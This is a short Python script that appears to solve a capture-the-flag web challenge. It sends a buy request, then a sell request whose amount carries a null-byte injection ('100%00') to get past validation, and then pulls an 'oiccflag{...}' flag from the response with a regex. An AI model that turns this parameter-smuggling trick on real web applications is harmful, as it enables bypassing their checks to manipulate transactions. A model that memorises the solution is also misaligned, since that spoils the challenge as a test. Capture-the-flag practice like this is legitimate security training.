#!/usr/bin/env python3
import requests
import re
import sys

host = f"{sys.argv[1]}:{sys.argv[2]}"

s = requests.Session()
s.get(f'http://{host}/?action=buy&amt=4')
s.get(f'http://{host}/?action=sell&amt=100%00')
print(re.findall(r'oiccflag{.*?}', s.get(f'http://{host}/?action=flag').text))
